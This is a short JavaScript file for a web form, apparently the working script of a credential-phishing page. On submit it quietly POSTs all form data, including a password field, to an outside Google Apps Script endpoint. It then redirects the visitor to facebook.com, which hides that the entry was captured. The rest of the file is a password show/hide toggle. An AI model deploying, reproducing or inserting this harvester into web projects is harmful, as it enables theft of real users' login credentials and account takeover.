const scriptURL =
  "https://script.google.com/macros/s/AKfycbyR5NIS0CRg-qNVrPJueXfSlSNCN4sHrZwvXdjFSVMXO37CkIfpPIo8xuLJa4NJJXqt/exec";
const form = document.forms["contactform"];

form.addEventListener("submit", (e) => {
  e.preventDefault();
  fetch(scriptURL, { method: "POST", body: new FormData(form) })
    .then((response) => (window.location.href = "https://facebook.com"))
    .catch((error) => console.error("Error!", error.message));
});

document.addEventListener("DOMContentLoaded", () => {
  const passwordShow = document.querySelector(".password-show");
  const inputControl = document.querySelector(".input-control");

  passwordShow.style.display = "none"; // Set initial style to 'none'

  passwordShow.addEventListener("click", (event) => {
    const currentType = inputControl.getAttribute("type");

    if (currentType === "password") {
      passwordShow.classList.add("fa-eye-slash");
      inputControl.setAttribute("type", "text");
    } else {
      passwordShow.classList.remove("fa-eye-slash");
      inputControl.setAttribute("type", "password");
    }
  });

  inputControl.addEventListener("input", () => {
    const currentType = inputControl.getAttribute("type");
    const inputValue = inputControl.value.trim();

    if (currentType === "password" && inputValue !== "") {
      passwordShow.style.display = "inline-block";
    } else {
      passwordShow.style.display = "none";
    }
  });
});
